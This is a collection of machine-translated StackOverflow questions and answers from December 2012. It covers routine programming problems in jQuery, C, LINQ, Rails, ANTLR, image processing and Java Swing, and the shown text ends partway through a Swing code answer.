# StackOverflow 问答 13822000-13822999

# jquery - jquery addClass 函数只有拳头一半有效

> ID：13822000
> 
> 赞同：0
> 
> 时间：2012-12-11T14:38:24.290
> 
> 标签：jquery, addclass, removeclass

我有一些链接，我想基本上做一个班级交换。当我像这样设置它时，它会一直运行：

```
$("#work").click(function() {
    $(".nav_middle_text").removeClass("selected");
    $(".nav_middle_text").addClass("notselected");
    $(this).removeClass("notselected");
    $(this).addClass("selected");  

    a1=1;

    $("#top_section").animate({
        height:30
    },450);
    $("#bottom_section").animate({
        height:$("#grid").outerHeight(true)
    }, 450); 
    $("#about_container").animate({
        marginTop:$("#about_container").outerHeight(true) *-1
    }, 450);   

}); 
```

但是当我尝试以这种方式设置它时，它会运行前两个添加和删除具有特定类的类，但后两个使用“this”不起作用。以这种方式运行它是否有理由阻止“这个”工作？

```
function nav_click() {
    $(".nav_middle_text").removeClass("selected");
    $(".nav_middle_text").addClass("notselected");
    $(this).removeClass("notselected");
    $(this).addClass("selected");          
}    

$("#work").click(function() {
    nav_click();

    a1=1;

    $("#top_section").animate({
        height:30
    },450);
    $("#bottom_section").animate({
        height:$("#grid").outerHeight(true)
    }, 450); 
    $("#about_container").animate({
        marginTop:$("#about_container").outerHeight(true) *-1
    }, 450);   
}); 
```

提前感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:41:49.783

当您调用函数`nav_click()`时，`this`不再是单击处理程序中的内容。如果要使用该`nav_click()`函数，则必须将 的值传递`this`给该函数。您可以通过`this`在函数内部进行适当设置来做到这一点：

```
nav_click.call(this); 
```

或者，您可以将其作为普通参数传递并更改 nav_click() 以使用该参数

```
nav_click(this);

function nav_click(item) {
    $(".nav_middle_text").removeClass("selected");
    $(".nav_middle_text").addClass("notselected");
    $(item).removeClass("notselected");
    $(item).addClass("selected");          
} 
```

仅供参考，`this`函数内部的值取决于该函数的调用方式。如果仅使用普通函数调用`nav_click()`，则将`this`重置为`window`对象（普通 JS 模式）或`undefined`（JS 严格模式）。

要在函数内显式`this`设置为特定值，请使用`.apply()`or `.call()`。有关这些方法的说明，请参见 MDN 页面，[此处](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/call)和[此处](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/apply)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T14:46:50.190

在匿名事件处理函数的上下文中，`this`引用发生事件的元素。出于这个原因，`this`没有引用您认为它在第二种情况下的含义。

但是，您可以将元素传递给函数：

```
function nav_click(element) {
    $(".nav_middle_text").removeClass("selected");
    $(".nav_middle_text").addClass("notselected");
    $(element).removeClass("notselected");
    $(element).addClass("selected");          
} 

$("#work").click(function() {
    nav_click(this);
    // etc
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:02:45.530

发生这种情况是因为您没有在回调函数中传递任何内容，您只需要传递元素，这不引用#work，因此您无法更改类这样做......

```
function nav_click(element) {
    $(".nav_middle_text").removeClass("selected");
    $(".nav_middle_text").addClass("notselected");
    $(element).removeClass("notselected");
    $(element).addClass("selected");          
}    
    $("#work").click(function() {
    nav_click(this);

    a1=1;

    $("#top_section").animate({
        height:30
    },450);
    $("#bottom_section").animate({
        height:$("#grid").outerHeight(true)
    }, 450); 
    $("#about_container").animate({
        marginTop:$("#about_container").outerHeight(true) *-1
    }, 450);   
}); 
```

# android - 为 Unity3D 构建字符

> ID：13822001
> 
> 赞同：1
> 
> 时间：2012-12-11T14:37:38.297
> 
> 标签：android, 3d, unity3d

我是 Unity 的新手。我将制作 3D 格斗游戏，所以我需要角色，以便我可以在 Unity 中自定义它们并开始我的工作。所以有人能告诉我有没有办法建立角色以便我不能浪费我的时间在其他 3D 建模中制作角色，就像 MAYA 等一样......所以我可以找到角色并根据我的需要定制它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T14:53:59.753

有多种资源，例如 Unity Asset Store、[Blendwap](http://www.blendswap.com)、[3DExport.com](http://3dexport.com/)、[Mixamo Autorigger](http://www.mixamo.com/c/automatic-rigging-for-blender-unity3d?utm_source=unity_blog)、[TurboSquid](http://www.turbosquid.com/)等，您可以在其中找到很多现成的模型。但请注意：

很有可能最后你会发现自己在 Blender、Maya 或任何你（不）喜欢的工具中进行调整和自定义；-) 几乎总是需要改变一些东西，然后你至少必须学习基本概念或找人为你做这件事。当您使用 Android 标记此问题时，您必须记住，您仅限于低多边形字符（<= 1000 个顶点，<= 30 个骨骼）

# vba - 替换 ADODB 记录集 VB6 中的函数

> ID：13822003
> 
> 赞同：2
> 
> 时间：2012-12-11T14:38:32.993
> 
> 标签：vba, ms-access, vb6, adodb

从 Visual Basic 应用程序中，我必须将列中包含的值**替换**为另一个值。使用**ADODB**我得到那个错误：“**未定义的函数替换**”我在我的**VB6**应用程序中使用**MS-ACCESS**数据库。 有什么办法吗？

 *** * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:10:42.667

似乎这样的事情可能适合：

```
 IIf(Right([item],1)=".",[item],[item] & ".") = 'FOODS A/C.' 
```**

# c# - linq orderby 不适用于子表上的动态值

> ID：13822006
> 
> 赞同：0
> 
> 时间：2012-12-11T14:38:40.257
> 
> 标签：c#, linq

> **可能重复：**
> [如何使用通用扩展方法中的字符串列名在 IQueryable 上应用 OrderBy？](https://stackoverflow.com/questions/307512/how-do-i-apply-orderby-on-an-iqueryable-using-a-string-column-name-within-a-gene)

我正在使用 LINQ orderby 语句来选择带有子表的父表。现在我想在包括父表和子表在内的所有字段中应用 orderby。我如何使用动态列名来实现这一点。请帮助我...这是我在这里使用的代码。

```
result = (from p in StudentDB.Student.Include("Student_addr")
                                  where (p.full_nm.Contains(searchCriteria.Name))
                                  select p); 
```

现在我正在调用一个扩展方法来应用 orderby ...

```
var stuType = typeof(Student);
                    var addressType = typeof(Student_addr);
                    list = result.Order<Student>(stuType , addressType ,searchCriteria.sortColumn, searchCriteria.sortCondition);

return  list.Take(searchCriteria.reccount).ToList(); 
```

扩展方法....

```
public static IQueryable<T> Order<T>(this IQueryable<T> items, Type stuType , Type addressType, string sortColumn, string sortOrder)
        {
            var typeOfT = addressType;
            var parameter = Expression.Parameter(typeOfT, "parameter");
            var propertyType = typeOfT.GetProperty(sortColumn).PropertyType;
            var propertyAccess = Expression.PropertyOrField(parameter, sortColumn);
            var orderExpression = Expression.Lambda(propertyAccess, parameter);

            Expression  expression =null;
            if (sortOrder == "Desc")
            {
                expression=Expression.Call(typeof(Queryable), "OrderByDescending", new Type[] { stuType , propertyType }, items.Expression, Expression.Quote(orderExpression));
            }
            else
            {
                expression = Expression.Call(typeof(Queryable), "OrderBy", new Type[] { stuType , propertyType }, items.Expression, Expression.Quote(orderExpression));
            }
            return items.Provider.CreateQuery<T>(expression);
        } 
```

当我在子表列名上运行时，我收到以下错误：

类型“System.Linq.Queryable”上没有通用方法“OrderBy”与提供的类型参数和参数兼容。如果方法是非泛型的，则不应提供类型参数。

提前致谢...

# image - 如何检测图案的边界

> ID：13822011
> 
> 赞同：1
> 
> 时间：2012-12-11T14:38:51.940
> 
> 标签：image, image-processing, pattern-matching, feature-detection, edge-detection

> **可能重复：**
> [检测模糊图像中的细线](https://stackoverflow.com/questions/13767850/detecting-thin-lines-in-blurry-image)

所以正如标题所说，我正在尝试检测模式的边界。在所附图片中，您基本上可以看到三种不同的图案。

1.  关闭条纹线
2.  一根粗L形线
3.  1和2之间的区域

我试图将这三个分开，比如 3 个单独的图像。取决于答案的去向，如果需要，我会上传更多图片。想法或代码都会有所帮助。

![在此处输入图像描述](../Images/ea22878b7aa81e4255b567408774de08.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T15:30:11.450

您可以使用形态学解决（对于“解决”的某些值）这个问题。首先，为了使图像更均匀，去除不相关的最小值。一种方法是使用区域最小值的 h-dome 变换来抑制高度 < 的最小值`h`。现在，我们要加入细线。这是通过具有长度水平线的形态开口来实现的`l`。如果线条被合并，那么当前图像的区域最小值就是背景。所以我们可以通过填充孔来获得相关的组件。以下代码总结了这些任务：

```
f = rgb2gray(imread('http://i.stack.imgur.com/02X9Z.jpg'));
hm = imhmin(f, h);
o = imopen(hm, strel('line', l, 0));
result = imfill(~imregionalmin(o), 'holes'); 
```

现在，您需要确定`h`和`l`。该参数`h`预计会更容易，因为它与输入的比例无关，在您的示例中，[10, 30] 范围内的值可以正常工作。确定`l`粒度分析可能会有所帮助。另一种方法是检查是否`result`包含两个重要的连通分量，对应于较大的 L 形状和细线区域。无需`l`逐个增加，您可以执行类似于二进制搜索的操作。

下面是`hm`,`o`和`result`带有`h = 30`and的图像`l = 15`（`l`在 [13, 19] 中同样适用）。这种方法为参数选择提供了灵活性，使其更容易选择/找到好的值。

![在此处输入图像描述](../Images/762656c03e1d8d2e5c04f8ed82443e2e.png) ![在此处输入图像描述](../Images/3d70a681f4ac8d19cadc0f8efa3473c7.png) ![在此处输入图像描述](../Images/a43a6ed7bd5bdabf7f00804a2ca145b4.png)

为了计算两个最大组件之间的空间面积，我们可以合并它们并简单地计算新连接组件内的黑色像素。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T16:03:44.803

只是抛出想法。您可以对图像进行二值化并进行连接组件标记。然后对连接的组件（例如宽度）进行一些分析以区分区域。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:11:11.573

您可以传递一个窗口（10x10 像素？）并收集该窗口的特征。这些特征可以像该窗口内的累积[梯度（边缘）一样简单。](http://en.wikipedia.org/wiki/Sobel_operator)只要窗口足够大，这将区分各个区域。

然后使用每个窗口作为数据点，你可以做一些聚类，或者如果模式变化不大，你可以做一些简单的阈值来确定哪些数据点属于哪些模式（较大的梯度和属于小线：更多的边缘，而最小的梯度和属于最粗的线：只有一个边缘，而介于两者之间的那些属于另一个“中间”模式。

获得此分类后，您可以根据需要创建单独的图像。

# android - 如何获取充值卡充值前缀码

> ID：13822012
> 
> 赞同：0
> 
> 时间：2012-12-11T14:38:53.557
> 
> 标签：android, sim-card

我想让我的android应用程序自动检测充值卡的前缀码，我不知道我是否可以做到，但我看到一个自动检测它的应用程序。

注：“充值前缀码用于充值卡充值，每个运营商都有自己的充值码”

# c - 如何一次打印结构中的所有值？

> ID：13822013
> 
> 赞同：0
> 
> 时间：2012-12-11T14:38:51.957
> 
> 标签：c, struct, printf

在这个我将有 4,5,6,25 的输出。如何一次尝试打印结构中的所有成员，而不是每次都访问结构的单个成员。就像我需要行的输出为 [4 5 6] 和年龄为 25 岁。请帮忙！

```
#include<stdio.h>

typedef struct person
{
  int row[3];
  int age;
} PERSON;

int main()
{
  PERSON p;
  PERSON *pptr=&p;
  pptr->row[0] = 4;
  pptr->row[1] = 5;
  pptr->row[2] = 6;
  pptr->age = 25;
  printf("%d\n",pptr->row[0]);
  printf("%d\n",pptr->row[1]);
  printf("%d\n",pptr->row[2]);
  printf("%d\n",pptr->age);
  return 0;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T14:40:55.273

您可以在单个`printf`语句中使用多个格式说明符

```
printf("[%d, %d, %d], age=%d\n",
       pptr->row[0], pptr->row[1], pptr->row[2], pptr->age); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T14:41:24.753

```
printf ("[%d  %d  %d]\nage: %d", pptr->row[0],pptr->row[1],pptr->row[2],pptr->age); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T14:47:06.353

没有办法在不访问每个成员的情况下“一次”打印，但是您可以通过使用多个说明符来稍微减少此代码。如果您需要打印多个结构的值，请考虑创建一个函数（甚至是宏），这将有助于减少代码量。

```
void
print_person (PERSON *p)
{
    printf(
        "[%d %d %d] %d\n",
        p->row[0],
        p->row[1],
        p->row[2],
        p->age
    );
}

print_person(&my_person); 
```

使用指针方法可以避免将整个结构复制为参数。但是您可能更喜欢使用这些简单的结构来保持简单。宏观方法：

```
#define PRINTP(p) printf("[%d %d %d] %d\n", p.row[0], p.row[1], p.row[2], p.age)

PRINTP(p); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-11T14:50:46.877

如果使用`glibc`（GNU libc，因此仅在使用时可用`gcc`，虽然不是 portbale），是否可以定义和注册“新”转换说明符以用于`glibc`'s`printf`函数族的实现，这些函数能够执行 OP在寻找。

有关这方面的更多信息，请阅读此处： [http](http://www.gnu.org/software/libc/manual/html_node/Registering-New-Conversions.html#Registering-New-Conversions) ://www.gnu.org/software/libc/manual/html_node/Registering-New-Conversions.html#Registering-New-Conversions和此处：[http://www.gnu。 org/software/libc/manual/html_node/Defining-the-Output-Handler.html#Defining-the-Output-Handler](http://www.gnu.org/software/libc/manual/html_node/Defining-the-Output-Handler.html#Defining-the-Output-Handler)

一个例子可以在这里找到：[http ://www.gnu.org/software/libc/manual/html_node/Printf-Extension-Example.html#Printf-Extension-Example](http://www.gnu.org/software/libc/manual/html_node/Printf-Extension-Example.html#Printf-Extension-Example)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-11T14:43:22.887

在允许您使用元编程和特征的语言中，您可以做到这一点，但在 C 中没有办法做到这一点。simonc 的答案是几乎每个人都使用的解决方案。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-11T14:43:35.447

C 没有提供自动执行此操作的方法。

当然，您可以编写自己的`print_struct_person`函数，但是您必须为要打印的每个函数编写一个函数。

如果你这样做是为了调试，你应该尝试一个真正的调试器：调试器*可以*做到。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-11T14:47:55.277

试试这个：

```
void print_at_once(PERSON *pptr)
{
  int i=0;
  for(i=0;i<3;i++)
    printf("%d\n",pptr->row[i]);
  printf("%d\n",pptr->age);
  return;
} 
```

# html - link_to_function 无法正常工作

> ID：13822014
> 
> 赞同：0
> 
> 时间：2012-12-11T14:39:13.143
> 
> 标签：html, ruby-on-rails, ruby, ruby-on-rails-3

我将 rails 应用程序从 rails 升级`2.3.14`到 rails `3.2.6`。link_to_function 没有生成正确的 html。

以下辅助方法。. .

```
link_to_function(name, h("add_fields(this, \"#{association}\", \"#{escape_javascript(fields)}\")")) 
```

正在生成...

```
<a href="#" onclick="add_fields(this, &amp;quot;quick_facts&amp;quot;, &amp;quot;&amp;lt;div class=\'quick_fact\'&amp;gt;\n  &amp;lt;div class=\'grid_4 prefix_1\'&amp;gt;\n    &amp;lt;label for=\&amp;quot;organization_quick_facts_attributes_new_quick_facts_quick_fact\&amp;quot;&amp;gt;QuickFact&amp;lt;\/label&amp;gt;\n    &amp;lt;br&amp;gt;\n    &amp;lt;select class=\&amp;quot;quick_fact_select\&amp;quot; id=\&amp;quot;organization_quick_facts_attributes_new_quick_facts_quick_fact\&amp;quot; name=\&amp;quot;organization[quick_facts_attributes][new_quick_facts][quick_fact]\&amp;quot;&amp;gt;&amp;lt;option value=\&amp;quot;\&amp;quot;&amp;gt;&amp;lt;\/option&amp;gt;\n    &amp;lt;option value=\&amp;quot;Hours\&amp;quot;&amp;gt;Hours&amp;lt;\/option&amp;gt;\n    &amp;lt;option value=\&amp;quot;Serving\&amp;quot;&amp;gt;Serving&amp;lt;\/option&amp;gt;\n    &amp;lt;option value=\&amp;quot;Insurance Accepted\&amp;quot;&amp;gt;Insurance Accepted&amp;lt;\/option&amp;gt;\n    &amp;lt;option value=\&amp;quot;Features\&amp;quot;&amp;gt;Features&amp;lt;\/option&amp;gt;\n    &amp;lt;option value=\&amp;quot;Services Provided\&amp;quot;&amp;gt;Services Provided&amp;lt;\/option&amp;gt;&amp;lt;\/select&amp;gt;\n    &amp;lt;br&amp;gt;\n  &amp;lt;\/div&amp;gt;\n  &amp;lt;div class=\'clear\'&amp;gt;&amp;lt;\/div&amp;gt;\n  &amp;lt;div class=\'grid_4 prefix_1\'&amp;gt;\n    &amp;lt;label for=\&amp;quot;organization_quick_facts_attributes_new_quick_facts_content\&amp;quot;&amp;gt;Content&amp;lt;\/label&amp;gt;\n    &amp;lt;br&amp;gt;\n    &amp;lt;input id=\&amp;quot;organization_quick_facts_attributes_new_quick_facts_content\&amp;quot; maxlength=\&amp;quot;200\&amp;quot; name=\&amp;quot;organization[quick_facts_attributes][new_quick_facts][content]\&amp;quot; size=\&amp;quot;200\&amp;quot; type=\&amp;quot;text\&amp;quot; /&amp;gt;\n    &amp;lt;br&amp;gt;\n  &amp;lt;\/div&amp;gt;\n  &amp;lt;div class=\'clear\'&amp;gt;&amp;lt;\/div&amp;gt;\n  &amp;lt;div class=\'grid_2 prefix_1 exempt\'&amp;gt;\n    &amp;amp;nbsp;\n    &amp;lt;a href=\&amp;quot;#\&amp;quot; class=\&amp;quot;remove_temp_qf\&amp;quot;&amp;gt;remove&amp;lt;\/a&amp;gt;\n  &amp;lt;\/div&amp;gt;\n&amp;lt;\/div&amp;gt;\n&amp;quot;); return false;">Add Another QuickFact</a> 
```

呈现此 html 时，未调用 onclick 函数，这是错误。

```
syntax error

add_fields(this, &quot;quick_facts&quot;, &quot;&lt;div class=\'quick_fact\'&gt;...

quick_facts# (line 1, col 17) 
```

有什么办法解决这个问题吗？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:01:02.177

#h 方法在 Rails 3 中发生了变化，Rails 3 现在自动转义“不安全”字符串。有关更多信息，请参阅[此问题](https://stackoverflow.com/questions/4070257/why-in-rails-3-note-html-safe-and-h-note-html-safe-give-the-same)。

# random - 是否有在 NSIS 中生成随机字符的功能

> ID：13822015
> 
> 赞同：1
> 
> 时间：2012-12-11T14:39:16.507
> 
> 标签：random, char, nsis

我需要在 NSIS 安装程序脚本中多次生成随机字符。是否有预定义的功能，或者甚至可能？如果是：如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:14:04.307

没有预定义函数，但 wiki 有插件和基本（非加密）纯 NSIS 随机函数可供选择：

*   [http://nsis.sourceforge.net/Rnd](http://nsis.sourceforge.net/Rnd)
*   [http://nsis.sourceforge.net/Random](http://nsis.sourceforge.net/Random)
*   [http://nsis.sourceforge.net/Pwgen_plug-in](http://nsis.sourceforge.net/Pwgen_plug-in)
*   [http://nsis.sourceforge.net/NsRandom_plug-in](http://nsis.sourceforge.net/NsRandom_plug-in)
*   [http://nsis.sourceforge.net/Generate_a_random_number](http://nsis.sourceforge.net/Generate_a_random_number)

# google-maps - 谷歌地图中可以使用jsonp吗

> ID：13822017
> 
> 赞同：0
> 
> 时间：2012-12-11T14:39:18.613
> 
> 标签：google-maps, google-maps-api-3, geocoding

我想知道 JSON 填充“jsonp”在 Google 地图 API 中是否有效？在应用程序中，我必须通过替换 bing 地图（已经开发）来实现谷歌地图。在下面的 url bing 使用 jsonp 来响应响应

[https://dev.virtualearth.net/REST/v1/Locations/37.556141,-122.287880?output=json&jsonp=LocationPane.drawLocationHistory_0_OnMap&key=SOME_KEY](https://dev.virtualearth.net/REST/v1/Locations/37.556141,-122.287880?output=json&jsonp=LocationPane.drawLocationHistory_0_OnMap&key=SOME_KEY)

我尝试将网址准备为并尝试了许多组合

[https://maps.googleapis.com/maps/api/geocode/json?latlng=18.5236,73.8478&jsonp=LocationPane.drawLocationHistory_0_OnMap&sensor=false](https://maps.googleapis.com/maps/api/geocode/json?latlng=18.5236,73.8478&jsonp=LocationPane.drawLocationHistory_0_OnMap&sensor=false)

但它不工作，因为它在 Bing 地图中工作。请让我知道在谷歌地图中是否可以使用 json 填充，或者有没有更好的方法来使用地理编码

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:05:17.377

geocoding-webservice 目前不支持 jsonp。

但是您可以使用 JS-API 的地理编码服务来检索结果并将它们传递给回调函数。

# parsing - ANTLR 没有找到定义的开始规则

> ID：13822018
> 
> 赞同：1
> 
> 时间：2012-12-11T14:39:18.353
> 
> 标签：parsing, antlr, abstract-syntax-tree

我正面临一个奇怪的 ANTLR 问题，它应该只输出一个 AST。

```
 grammar ltxt.g;

options
{
    language=CSharp3;
}

prog    : start
    ;

start       :   '{Start 'loopname'}'statement'{Ende 'loopname'}'
        |   statement
        ;

loopname    :   (('a'..'z')|('A'..'Z')|('1'..'9'))*;
statement   :   '<%' table_ref '>'
        |   start;

table_ref   :   '{'format'}'ID;

format      :   FSTRING 
        |   FSTRING OFSTRING{0,5}
        ;
FSTRING :   '#F'
    |   '#D'
    |   '#U'
    |   '#K'
    ;

OFSTRING:   'F'
    |   'D'
    |   'U'
    |   'K'
    //| 1..65536
    ;

ID  :   ('a'..'z'|'A'..'Z'|'_') ('a'..'z'|'A'..'Z'|'0'..'9'|'_')*
    ;

WS  :   ( ' '
        | '\t'
        | '\r'
        | '\n'
        ) {$channel=HIDDEN;}
    ; 
```

当我尝试编码生成时，我得到了

*   错误（100）：LTXT.g:1:13：语法错误：antlr：MismatchedTokenException（74！= 52）。我没有声明任何 74 或 52。
*   我也没有得到 Synatx 图，因为无法找到“规则“开始””作为开始状态......

我知道这并不漂亮，但我认为它至少会起作用:)

最好的，希望

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T19:10:38.773

我看到了四个错误。

*   语法名称不能包含句点。这就是您遇到的语法错误。错误消息是一个提示，`74!=52`告诉您 ANTLR 在期望令牌 id 52 时发现了令牌 id 74，在这种情况下，它只是转换为“它在期望其他东西时发现了一件事”。
*   语法名称（“ltxt”）和扩展名之前的文件名（“LTXT”）需要完全匹配。
*   `output=AST;`除非您在该`options`部分中指定，否则该语法不会产生 AST 。
*   `format`的第二个选择 ( `FSTRING OFSTRING{0,5}`) 不会做我认为你认为它会做的事情。ANTLR 不支持任意数量的匹配，例如“匹配零到五个`OFSTRING`s”。您需要使用为您计算出现次数的[语义谓词重新定义规则。](https://stackoverflow.com/a/3056517/1201210)它们并不难使用，但它们是 ANTLR 中比较棘手的部分之一。

我希望这可以帮助您入门。

# java - 奇怪的 JFrame 行为

> ID：13822019
> 
> 赞同：2
> 
> 时间：2012-12-11T14:39:23.477
> 
> 标签：java, swing, jframe, actionlistener

我有以下程序，它在运行时有一些非常奇怪和不需要的行为。它应该有两个按钮，“开始”和“停止”，但是当我单击“开始”时，另一个按钮会显示在“开始”下方。这是我正在谈论的打印屏幕：

![在此处输入图像描述](../Images/ddb78c820187f3d844062bcf2c346b1e.png)

我做错了什么，我该如何解决这个丑陋的问题？

这是代码：

```
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.util.Random;

public class TwoButtonsTest {

    JFrame frame;
    Timer timer;
    boolean isClicked;

    public static void main(String[] args) {
    TwoButtonsTest test = new TwoButtonsTest();
    test.go();
    }

    public void go() {
    frame = new JFrame();
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.setSize(500, 500);

    JButton startButton = new JButton("Start");
    startButton.addActionListener(new StartListener());
    JButton stopButton = new JButton("Stop");
        stopButton.addActionListener(new StopListener());

    final DrawPanel myDraw = new DrawPanel();

    frame.getContentPane().add(BorderLayout.CENTER, myDraw);
    frame.getContentPane().add(BorderLayout.NORTH, startButton);
    frame.getContentPane().add(BorderLayout.SOUTH, stopButton);

    frame.setVisible(true);

    timer = new Timer(50, new ActionListener() {
        @Override
        public void actionPerformed(ActionEvent ae) {
            myDraw.repaint();
        }
        });
    }

    class StartListener implements ActionListener {
    public void actionPerformed(ActionEvent e) {
        //needs to be implemented
        if(!isClicked) {
        }
        isClicked = true;
        timer.start();
    }
    }

    class StopListener implements ActionListener {
    public void actionPerformed(ActionEvent e) {
        //needs to be implemented
        timer.stop();
        isClicked = false;
    }
    }

    class DrawPanel extends JPanel {
    public void paintComponent(Graphics g) {

        int red = (int)(Math.random()*256);
        int blue = (int)(Math.random()*256);
        int green = (int)(Math.random()*256);

        g.setColor(new Color(red, blue, green));

        Random rand = new Random();
        // following 4 lines make sure the rect stays within the frame
        int ht = rand.nextInt(getHeight());
        int wd = rand.nextInt(getWidth());

        int x = rand.nextInt(getWidth()-wd);
        int y = rand.nextInt(getHeight()-ht);

        g.fillRect(x,y,wd,ht);
    }
    } // close inner class
} 
```

此外，我试图让“开始”按钮做两件事。一个当然是开始动画，但是当按下停止按钮并再次按下开始时，我希望它可以清理屏幕并重新开始动画。有什么建议吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:28:39.450

您不会调用您应该调用`super.paintComponent(Graphics g)`的重写`paintComponent(..)`方法，以尊重*油漆链*，从而尊重其他组件的油漆。

此调用也应该是方法中的第一个调用：

```
@Override
public void paintComponent(Graphics g) {
     super.paintComponent(g);

    //do painting here
} 
```

可能会出现图纸不持久的问题。您必须有一种方法来存储图纸并每次重绘。最常见的是`ArrayList`保存要绘制的对象（因此您不能添加到列表中删除等），您将遍历列表并重绘`paintComponent`. 例如，请参阅我的答案[here](https://stackoverflow.com/questions/13358658/paintcomponent-draws-other-components-on-top-of-my-drawing/13359279#13359279)。

*   [另外请记住在Event Dispatch Thread](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/dispatch.html)上创建和操作 Swing 组件：

    ```
    SwingUtilities.invokeLater(new Runnable() {
        @Override
        public void run() {
             //create UI and components here
        }
    }); 
    ```

*   不要调用`setSize(..)`而`JFrame`不是覆盖并返回适合所有组件`getPreferredSize()`的`JPanel`适当高度，而不是`JFrame#pack()`在设置`JFrame`可见之前调用（但在添加所有组件之后）。

*   `getContentPane().add(..)`从 Java 6+开始不需要`add(..)`默认为*contentPane*

*   不要重新声明，`Random`即`Random r=new Random()`每次`paintComponent`被调用，因为这会使值的分布不那么*随机*，而是在创建类时启动一次并调用实例上的方法

这是固定代码（实施了上述修复）：

![在此处输入图像描述](../Images/82532b1870f41a08bb520daa5f57bf23.png)

```
import java.awt.*;
import java.awt.event.*;
import java.util.ArrayList;
import java.util.Random;
import javax.swing.*;

public class TwoButtonsTest {

    JFrame frame;
    Timer timer;
    boolean isClicked;

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                TwoButtonsTest test = new TwoButtonsTest();
                test.go();
            }
        });
    }
    final DrawPanel myDraw = new DrawPanel();

    public void go() {
        frame = new JFrame();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        JButton startButton = new JButton("Start");
        startButton.addActionListener(new StartListener());
        JButton stopButton = new JButton("Stop");
        stopButton.addActionListener(new StopListener());

        frame.add(myDraw, BorderLayout.CENTER);
        frame.add(startButton, BorderLayout.NORTH);
        frame.add(stopButton, BorderLayout.SOUTH);

        frame.pack();
        frame.setVisible(true);

        timer = new Timer(50, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                myDraw.repaint();
            }
        });
    }

    class StartListener implements ActionListener {

        @Override
        public void actionPerformed(ActionEvent e) {
            //needs to be implemented
            if (!isClicked) {
            }

            myDraw.clearRects();

            isClicked = true;
            timer.start();
        }
    }

    class StopListener implements ActionListener {

        public void actionPerformed(ActionEvent e) {
            //needs to be implemented
            timer.stop();
            isClicked = false;
        }
    }

    class DrawPanel extends JPanel {

        private ArrayList<MyRectangle> rects = new ArrayList<>();
        private Random rand = new Random();

        @Override
        public void paintComponent(Graphics g) {
            super.paintComponent(g);

            addRect();
            for (MyRectangle r : rects) {
                g.setColor(r.getColor());
                g.fillRect(r.x, r.y, r.width, r.height);
            }
        }

        @Override
        public Dimension getPreferredSize() {
            return new Dimension(500, 500);
        }

        public void clearRects() {
            rects.clear();
        }

        public void addRect() {
            // following 4 lines make sure the rect stays within the frame
            int ht = rand.nextInt(getHeight());
            int wd = rand.nextInt(getWidth());

            int x = rand.nextInt(getWidth() - wd);
            int y = rand.nextInt(getHeight() - ht);

            int red = (int) (Math.random() * 256);
            int blue = (int) (Math.random() * 256);
            int green = (int) (Math.random() * 256);

            rects.add(new MyRectangle(x, y, wd, ht, new Color(red, blue, green)));
        }
    } // close inner class
}

class MyRectangle extends Rectangle {

    Color color;

    public MyRectangle(int x, int y, int w, int h, Color c) {
        super(x, y, w, h);
        this.color = c;
    }

    public Color getColor() {
        return color;
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-11T16:14:06.647

我希望我能提供一个解决方案，但到目前为止我还没有找到一个。我可以告诉你这里“问题”的根源在于你绘制 BorderLayout 的中心部分的方式。您正在覆盖该程序的整个 paintComponent() 函数，并将它创建的任何内容放入 BoarderLayout 的中心。在这种情况下，每次单击按钮时，程序都会调用重绘来绘制单击按钮的图像，但由于您还向中心面板添加了任何绘制的对象，因此它也被绘制在那里。由于此特定重绘未指定位置，因此它位于左上角。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-11T14:58:39.507

我通过调用 SwingUtilities 修复了我的 Windows XP 计算机上的按钮问题。

我格式化了你的 Java 代码。

```
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Graphics;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Random;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;
import javax.swing.Timer;

public class TwoButtonsTest implements Runnable {

    JFrame frame;
    Timer timer;
    boolean isClicked;

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new TwoButtonsTest());
    }

    @Override
    public void run() {
        frame = new JFrame();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(500, 500);

        JButton startButton = new JButton("Start");
        startButton.addActionListener(new StartListener());
        JButton stopButton = new JButton("Stop");
        stopButton.addActionListener(new StopListener());

        final DrawPanel myDraw = new DrawPanel();

        frame.getContentPane().add(BorderLayout.CENTER, myDraw);
        frame.getContentPane().add(BorderLayout.NORTH, startButton);
        frame.getContentPane().add(BorderLayout.SOUTH, stopButton);

        frame.setVisible(true);

